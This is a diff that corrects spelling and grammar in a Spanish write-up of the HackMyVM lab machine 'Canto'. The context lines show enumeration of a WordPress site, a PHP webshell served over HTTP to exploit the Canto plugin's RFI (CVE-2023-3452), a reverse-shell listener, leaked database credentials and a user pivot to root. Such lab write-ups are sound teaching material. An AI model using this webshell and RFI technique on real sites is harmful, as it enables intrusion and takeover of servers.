@@ -2,7 +2,7 @@
 Estado: Completado
 Plataforma: HackMyVM
 SO: Linux
-Dificultad: Facil
+Dificultad: Fácil
 VectorInicial: Vulnerable WordPress Plugin (Canto - CVE-2023-3452)
 ServicioInicial: HTTP
 PuertoInicial: 80
@@ -36,7 +36,7 @@ Fecha: 2026-04-01
 ---
 <img width="352" height="503" alt="Pasted image 20260401092842" src="https://github.com/user-attachments/assets/14722750-db0d-4cc5-921a-3184ab0c440b" />
 
-Lo que primero tendremos que realizar sera un descubrimiento de red para encontrar la maquina objetivo.
+Lo primero que tendremos que realizar será un descubrimiento de red para encontrar la máquina objetivo.
 
 ```bash
  sudo arp-scan -I eth0 --localnet                                  
@@ -52,7 +52,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.924 seconds (133.06 hosts/sec). 3 responded
 ```
 
-Como podemos observar la IP es `10.0.11.19` así que empecemos con una enumeración de puertos de la maquina.
+Como podemos observar, la IP es `10.0.11.19`, así que empecemos con una enumeración de puertos de la máquina.
 
 ```bash
  settarget 10.0.11.19            
@@ -87,14 +87,14 @@ Veamos que tenemos en la web.
 
 <img width="1316" height="359" alt="Pasted image 20260401094829" src="https://github.com/user-attachments/assets/a150fbb6-91d4-474f-a627-69ec0dcc89dd" />
 
-A primera vista parece una web muy simple y sin sentido ademas de parecer estática, pero si miramos el código pulsando `CTRL+U` vemos algo muy diferente.
+A primera vista parece una web muy simple y sin sentido, además de parecer estática, pero si miramos el código pulsando `CTRL+U` vemos algo muy diferente.
 
 ```html
 <meta name="generator" content="WordPress 6.9.4" />
 <script type="importmap" id="wp-importmap">
 ```
 
-Nos encontramos ante un **Wordpress** y por consiguiente nos da un punto de partida, veamos que encontramos.
+Nos encontramos ante un **WordPress** y, por consiguiente, ya tenemos un punto de partida. Veamos qué encontramos.
 
 ```bash
  wpscan --url http://$TARGET -e u,p --plugins-detection aggressive
@@ -207,7 +207,7 @@ Finished
 ===============================================================
 ```
 
-Como la mayoría de listas que trae por defecto el sistema, ya se Kali o Parrot, incluso `seclist` no detectan todos los plugins opte por crearme una yo mismo, busque en **GitHub** varias listas y las combine para hacer un diccionario mas grande, casi 100.000 entradas.
+Como la mayoría de listas que trae por defecto el sistema, ya sea Kali o Parrot, e incluso `SecLists`, no detectan todos los plugins, opté por crearme una propia. Busqué en **GitHub** varias listas y las combiné para hacer un diccionario más grande, de casi 100.000 entradas.
 
 ```bash
  gobuster dir -u http://$TARGET/wp-content/plugins/ -w wp-plugins-final.txt -x html,php,txt,js 
@@ -234,7 +234,7 @@ Finished
 ===============================================================
 ```
 
-Ahora si hemos encontrado el `plugin` en cuestión de esta maquina.
+Ahora sí hemos encontrado el `plugin` en cuestión de esta máquina.
 
 Ahora veamos su versión y que vulnerabilidad podemos usar.
 
@@ -261,7 +261,7 @@ Veamos si encontramos alguna vulnerabilidad para esta versión.
 https://www.exploit-db.com/exploits/51826
 ```
 
-Parece que esta versión tienen la vulnerabilidad `CVE-2023-3452` relativa a un `RFI` y un `RCE`.
+Parece que esta versión tiene la vulnerabilidad `CVE-2023-3452`, relativa a un `RFI` y un `RCE`.
 
 Vamos por partes ya que lo haremos de manera manual en lugar de usar los exploits.
 
@@ -272,13 +272,13 @@ Primero crearemos un fichero con código **php** para generar un `webshell`.
  echo '<?php system($_GET["cmd"]); ?>' > wp-admin/admin.php
 ```
 
-Esto lo hacemos así puesto que la petición la realizara mediante esa dirección, así que en la carpeta en la que estamos, antes de `wp-admin` lanzaremos un servidor web, en `python` por ejemplo.
+Esto lo hacemos así puesto que la petición la realizará mediante esa dirección. Por tanto, en la carpeta en la que estamos, justo por encima de `wp-admin`, lanzaremos un servidor web, por ejemplo con `python`.
 
 ```bash
  python3 -m http.server 8000
 ```
 
-Al mismo tiempo que esta el servidor web corriendo vamos a ponernos a la escucha para recibir la `revershell`.
+Al mismo tiempo que está el servidor web corriendo, vamos a ponernos a la escucha para recibir la `reverse shell`.
 
 ```bash
  penelope -p 4444
@@ -331,7 +331,7 @@ define( 'DB_PASSWORD', '2NCVjoWVE9iwxPz' );
 define( 'DB_HOST', 'localhost' );
 ```
 
-Ademas tenemos algo curioso al investigar al usuario `erik`.
+Además, encontramos algo curioso al investigar al usuario `erik`.
 
 ```bash
 www-data@canto:/var/www/html$ cd /home/erik/
@@ -370,7 +370,7 @@ www-data@canto:/var/wordpress/backups$ cat 12052024.txt
 www-data@canto:/var/wordpress/backups$ 
 ```
 
-Tenemos ganador y ya no tenemos que usar los datos que teníamos para investigar la base de datos, con esto ya tenemos un contraseña para ver si podemos cambiarnos al usuario `erik`.
+Tenemos premio y ya no necesitamos usar los datos que teníamos para investigar la base de datos. Con esto ya tenemos una contraseña para comprobar si podemos cambiarnos al usuario `erik`.
 
 ```bash
 www-data@canto:/var/wordpress/backups$ su erik
@@ -409,4 +409,4 @@ Como hemos podido ver en este laboratorio podemos mediante enumeración dar con 
 
 Posteriormente explotamos una vulnerabilidad de forma manual en lugar de usar los exploits públicos para el `CVE-2023-3452`.
 
-Por último realizamos un `pivoting` de usuarios para finalmente llegar a comprometer el `root`.
+Por último, realizamos un `pivoting` de usuarios para finalmente llegar a comprometer al usuario `root`.
